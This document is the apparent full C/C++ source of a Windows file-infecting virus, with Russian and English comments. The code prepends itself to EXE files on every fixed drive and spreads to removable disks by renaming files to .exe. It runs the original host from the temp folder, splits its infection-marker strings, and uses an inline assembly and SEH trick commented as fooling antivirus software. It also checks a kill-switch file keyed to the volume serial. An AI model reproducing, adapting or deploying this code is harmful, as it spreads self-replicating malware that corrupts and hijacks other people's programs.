//---------------------------------------------------------------------------
#include <windows.h>
//#include <registry.hpp>
#include <fstream.h>
//#include <string.h>
//#include <stdio.h>
//#include <stdlib.h>
//#include <time.h>
#include <dir.h>
//#include <dos.h>
#pragma hdrstop

//trace
//SHSTDAPI_(HINSTANCE) ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
//DWORD WINAPI	GetTempPath(DWORD nBufferLength, LPSTR lpBuffer);

int drivers[25];                                    //vinchesters
int remdrv[15];                                     //removed disks
char vfile[255];                                    //name of virus file
char vdir[255]="";
int seachdone[25];
unsigned int loop=0;                                 // flag true-then the disk has seached
int seach_drv(int drv[25]);
int seach_remdrv(int remdrv[15],int drv[25]);       //find removed disk
int do_virus (char file[255], char vfile[255] );
int extract_file(char vfile[255]);                //rerutn file directory
int seach_dir(char *path,int mode=0);
bool illfile(char *file,char *flag);
int registry();
int hider();
//---------------------------------------------------------------------------
#pragma argsused
WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    //дурим антивирус
    //HANDLE h = CreateFileA("C:\System Volume Information", FILE_READ_ACCESS, 0, 0, OPEN_EXISTING, 0, NULL);
    //if (h == INVALID_HANDLE_VALUE)
    //int t = MessageBoxA(NULL,"asd","saxa",NULL);
    //int t = GetTickCount();
    char operand[4] = {0x0F,0x18,0x00,0xC2};
    char *p =operand;
    operand[3]++;
    asm{
        call p;
        sub eax,eax;
        jz _2;
        jmp _1;
_2:
        PUSH  0x000112a8; //адрес скрытой вирусной процедуры
        PUSH dword ptr FS:[00000000] ;// адрес предыдущего SEH-обработчика
        MOV dword ptr FS:[00000000], ESP ; //регистрируем новый SEH-обработчик
        MOV EAX, dword ptr DS:[00000000] ; //возбуждаем исключение, передавая
    }
_1:
    exit (0);
        int i,j;
        char run_dir[512];
        GetModuleFileName(GetModuleHandle(NULL),run_dir,255);
        //получение имени файла вируса
	//strcpy(vfile,argv[0]);
        for(i=0;run_dir[i];i++)
                vfile[i]=run_dir[i];
        vfile[i]=0;
        //получение директории вируса
        for(i=strlen(vfile)-1; vfile[i]; i--)
                if (vfile[i]=='\\')
                        break;
        for (j=0;j<i+1;j++)
                vdir[j]=vfile[j];
        vdir[j]=0;
        //получение командной строки
        lpCmdLine = GetCommandLine();
        //выделяем второй параметр
        bool kav = false; //нечувствительность к пробелам в кавычках
        char *vtoroi_parametr;
        for(vtoroi_parametr=lpCmdLine; *vtoroi_parametr ;vtoroi_parametr++)
                {if(*vtoroi_parametr=='"') kav=!kav;
                if(!kav && *vtoroi_parametr==' ')
                        break;
                }
        for(; *vtoroi_parametr!=0 && *vtoroi_parametr==' ';vtoroi_parametr++);//пропуск пробелов
        //слияние вируса с жертвой
        if(strlen(vtoroi_parametr)!=0)
                do_virus(vtoroi_parametr,vfile);
        //скрытие процесса
        //hider();
        // запуск дочернего файла
        extract_file(vfile);
        //начало работы вируса, но возможен код завершения, если есть иммуннитет
	seach_drv(drivers);

	return 0;
}
//---------------------------------------------------------------------------
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
int do_virus (char file[255], char vfile[255] )
{
        //static vir=0;
        //vir++;
        //return 0;
        char tempfile[255]="";
	char data;
        char a[][12]={"Start_Infor","End_Infor","End-End"};  // чтобы в теле вируса
        a[0][11]='m'; a[1][9]='m';                 // не встречались Start_Inform End_Inform
	const int lena[]={12,10,7};
	unsigned flag;
        int i;

        // проверка на зараженность
        if(illfile(file,a[2]))
                return 4;

	//make tempfile
        int j;
	for(j=0; file[j]; j++) tempfile[j]=file[j];
	tempfile[j-1]='_';
	if (rename(file,tempfile)) return 2;

	// open virus stream
	ifstream in(vfile, ios::in| ios::binary);
	if (!in) return 1;

	ofstream out (file,ios::out|ios::binary);
	if (!out)  return 2;

	// copy virus
	flag=1;
	while (in&&flag)
	{
		in.get(data);
		if (data!=a[0][0])
			out.put(data);
		else
		{
			char d[12];
			d[0]=a[0][0];
                        int i;
			for (i=1; i<lena[0];i++)
			{
				in.get(d[i]);
				if (a[0][i]!=d[i]) break;
			}
			if (i!=lena[0]) for(int j=0; j<=i;j++)
                                out.put(d[j]);
			else flag=0;
		}
	  }
	in.close();

	//write information about file
	for (int i=0;i<2;i++)
	{
		for(int j=0; j<lena[i];j++) out.put(a[i][j]);
		if (i==0)
		{
                        int j;
			for (j=strlen(file); file[j]!='\\'; j--);
			for(register int k=j+1; file[k]; k++)
                                out.put(file[k]);
		}
	};


	// open found file steam
	ifstream fin(tempfile, ios::in| ios::binary);
	if (!fin) return 3;

	// copy file
	while (!fin.eof())
	{
		fin.get(data);
		out.put(data);

	}
        for(int i=0;i<lena[2];i++)
                out.put(a[2][i]);
        fin.close();
        out.close();
	if (remove(tempfile))
                return 3;

	return 0;
} //do_virus
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
int extract_file(char vfile[255])
{
	char dir[255]="";
	char outfile[255]="";
	char data;


	char a[][12]={"Start_Infor","End_Infor"};  // чтобы в теле вируса
        a[0][11]='m'; a[1][9]='m';                 // не встречались Start_Inform End_Inform
	int lena[]={12,10};
	int flag;

	// open virus stream
	ifstream in(vfile, ios::in| ios::binary);
	if (!in) return 1;

	// extruct file
	flag=1;
	while (!in.eof() && flag)
	{
		//seach "Srart_Inform"
		in.get(data);
		if (data==a[0][0])
		{
			int i;
			char d[12];
			d[0]=a[0][0];
			for (i=1; i<lena[0];i++)
			{
				in.get(d[i]);
				if (a[0][i]!=d[i]) break;
			}
			//"Start_Inform" is found?
			if (i==lena[0])
			{
				int p;         //outfile name leght
				p=0;
				while (!in.eof() && flag)
				{
					//seach "End_Inform"
					in.get(data);
					if (data==a[1][0])
					{
						char c[10];
						c[0]=a[1][0];
						for (i=1; i<lena[1];i++)
						{
							in.get(c[i]);
							if (a[1][i]!=c[i]) break;
						}
						//"End_Inform" is found?
						if (i==lena[1])
						{
							//open file dir
                                                        GetTempPath(255,dir);
							strcat(dir,outfile);
							ofstream out(dir ,ios::out|ios::binary);
							if (!out)  return 1;
							//copyfile
							while (!in.eof())
							{
								in.get(data);
								out.put(data);
							}
							out.close();
							flag=0;         //exit vfile
						}
						else
						{
							//get outfile name
							for(int j=0; j<=i; j++)
							{
								outfile[p]=c[j];
								p++;
							}
						}


					}
					else
					{
						//get outfile name
						outfile[p]=data;
						p++;

					}
				}
			}
		}
	  }
	in.close();
        if(dir[0])
                ShellExecuteA(0, NULL, dir, NULL, NULL, 1);
	return 0;
}//extruct_file
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
int seach_dir(char *path,int mode)
{
	int done;
	const int dir_deep=32; //deep of seaching directoryes
	struct ffblk file;
	int count=0;
	char dir[dir_deep][MAXPATH];
	int dircount=0,remdiskvir=0;
        int i,j,k,fl;
        char data;
        char a[][12]={"Start_Infor","End_Infor","End-End"};  // чтобы в теле вируса
        a[0][11]='m'; a[1][9]='m';                          // не встречались Start_Inform End_Inform

        Sleep(1);
	//done=chdir(path);
	if (chdir(path)) return 0;

	//seach files
	done=findfirst("*.*", &file,7);
	while(!done)
	{
                if (file.ff_name[0]=='.')
		{
			done=findnext(&file);
			continue;
                }
                char findfile[512]="";
                char ext[256]="";
                char name[256]="";
                 //find extension in file name
                 for(i=strlen(file.ff_name)-1; file.ff_name[i]; i--)
                        if (file.ff_name[i]=='.')
                                break;
                 for(j=0,k=0;file.ff_name[j]; j++)
                 {
                        if (j<i)
                        {
                                name[k++]=file.ff_name[j];
                        }
                        else if(j>i)
                        {
                                ext[k++]=file.ff_name[j];
                        }
                        else if(i==j)
                                {name[k]=0;
                                k=0;
                                }
                 }
                 ext[k]=0;

                 //make full file name
                 char tempfile[255]="";
                 findfile[0]=getdisk()+'A';
                 strcat(findfile,":");
                 strcat(findfile,path);
                 if (strlen(findfile)!=3) strcat(findfile,"\\");
                 strcat(findfile,name);
                 if (!mode)
                 {
				//randomize();
				if (!strcmp(ext,"exe") || !strcmp(ext,"EXE"))
                                        //if(!random(9))
                                        {
       					        strcpy(tempfile,findfile);
                                                strcat(tempfile,".");
					        strcat(tempfile,ext);
					        do_virus(tempfile,vfile);
                                        }
				/*if ((!strcmp(ext,"mp3")||!strcmp(ext,"MP3"))&& !random(2))
				{
                                        char findf[255]="";
                                        strcpy(findf,findfile);
                                        strcat(findf,ext);
                                        if (!illfile(findf,a[2]))
                                        {
					        do
					        {
						        strcpy(tempfile,findfile);
						        tempfile[strlen(findfile)-strlen(name)+random(strlen(name)-1)]=random(26)+'a';
						        strcat(tempfile,ext);
						        ifstream in(findf, ios::in| ios::binary);
						        ofstream out (tempfile,ios::out|ios::binary);
						        if (in && out)
						        {
							        while(!in.eof())
							        {
								        in.get(data);
								        out.put(data);
							        }
                                                                for(unsigned int i=0;i<strlen(a[2]);i++)
                                                                        out.put(a[2][i]);
						        }
                                                        in.close();
                                                        out.close();
					        }while(random(5));
                                        }
				}*/
                }
                else
                {
                                strcpy(tempfile,findfile);
                                strcat(tempfile,".exe");
                                strcat(findfile,".");
                                strcat(findfile,ext);
				if(!do_virus(findfile,vfile))
                                {
                                        remdiskvir++;
                                        rename(findfile,tempfile);
                                }
				if(remdiskvir==5)
                                         return 0;
		}
		done=findnext(&file);
	}

	//seach directory
	done=findfirst("*",&file,17);
	while(!done && count<dir_deep)
	{
		if (file.ff_name[0]=='.')
		{
			done=findnext(&file);
			continue;
                }
		strcpy(dir[count],path);
		if (strlen(dir[count])!=1)
                        strcat(dir[count],"\\");
		strcat(dir[count],file.ff_name);
		done=findnext(&file);
		count++;
	}

        dircount+=count;
        //seach removed disk
        loop++;
	if(!mode && loop>1000){
                loop=0;
                seach_remdrv(remdrv,drivers);}
        //seach in found directoryes
	for(int i=0; i<count; i++)
                dircount+=seach_dir(dir[i],mode);

	return dircount;
}//seach_dir

/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
int seach_drv(int drv[25])
{
   int seachdisk[25];
   int save;
   int disk;
   int rnd;
   int wk;
   int j;
   int disks=0;
   char d[4];
   unsigned int errmode;

   for(j=0;j<25;j++)
   {
	drv[j]=-1;
	seachdisk[j]=0;
   }

   /* save original drive and get numbers of logical disk */
   save = getdisk();

   /* the drive letters available */
   errmode = SetErrorMode ( SEM_FAILCRITICALERRORS );
   for (disk = 0;disk < 25;++disk)
   {
      setdisk(disk);
      if (disk == getdisk())
      {
        d[0]=getdisk()+'A';
        d[1]=':';
        d[2]='\\';
        d[3]=0;
        if (GetDriveType(d)==3 || GetDriveType(d)==1)
        {
                drv[disks]=disk;
                disks++;
        }
      }
   }
   // проверка кода завершения
   registry();

   //поиск по переносным устройствам
   seach_remdrv(remdrv,drivers);

   //reach in dis
   for(int k=0;k<disks;){
        int r;
        do{
                r=GetTickCount()%25;
        }while(drv[r]==-1);
        k++;
        setdisk(drv[r]);
        seach_dir("\\");
        }
    SetErrorMode ( errmode );

   setdisk(save);

   return 0;
} //seach_drv
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
int seach_remdrv(int remdrv[15], int drv[25])
{
	int disk,save,wk;
	int dcount=0;
        char d[2];

	for(int i=0;i<15;i++) remdrv[i]=-1;

	/* save original drive and get numbers of logical disk */
	save = getdisk();

	/* seach the removed drives */
	for (disk = 0;disk < 25;++disk)
	{
	setdisk(disk);
	if (disk == getdisk())
		{
                        int i;
			for(i=0;i<25;i++)
				if (disk==drv[i] && disk!=-1)
					break;
			if(i==25)
			{
                                d[0]=getdisk()+'A';
                                d[1]=':';
                                if (GetDriveType(d)==3 || GetDriveType(d)==2 || GetDriveType(d)==1)
                                {
                                        remdrv[dcount]=disk;
				        dcount++;
                                }

			}

		}
	}
	// do virus in removed disk
	wk=0;
	while(remdrv[wk]!=-1)
	{
		setdisk(remdrv[wk]);
		seach_dir("\\",1);
                wk++;
	}

	setdisk(save);
	return 0;
}//seach_remdrv
//---------------------------------------------------------------------------
bool illfile(char *file,char *flag)
{
        // проверка на зараженность
        unsigned int i;
        char data;
        ifstream pin (file,ios::out|ios::binary);
	if (!pin)  return 2;
        pin.seekg((-7),ios::end);
        for(i=0;i<strlen(flag);i++)
        {
                pin.get(data);
                if (flag[i]!=data)
                        break;

        }
        pin.close();
        if (i==7)
                return true;
        else
                return false;
}
//-----------------------------------------------------------------------
int registry()
{
        DWORD Number=0;
        char NameBuffer[MAX_PATH];
	char SysNameBuffer[MAX_PATH];
	DWORD VSNumber;
	DWORD MCLength;
	DWORD FileSF;
        char disk[3]="";
        //проверка код завершения
        ifstream in("C:\\savor",ios::in | ios::binary);
        if(!in)
                return 1; //файла нет
        //читаем
        unsigned int i=0;
        unsigned char data;
        do{
                in.get(((char*)&Number)[i]);
                i++;
                }while(i<4 && !in.eof());
        in.close();
        //получаем id жесткого
        disk[0]=drivers[0]+'A';
        disk[1]=':';
        disk[2]='\\';
	GetVolumeInformation("C:\\",NameBuffer, sizeof(NameBuffer),
		&VSNumber,&MCLength,&FileSF,SysNameBuffer,sizeof(SysNameBuffer));
        VSNumber=VSNumber*3^0xd59EC64A;
        if (VSNumber==Number)
                exit(0);
        return 0;
}
//----------------------------------------------------------------------------
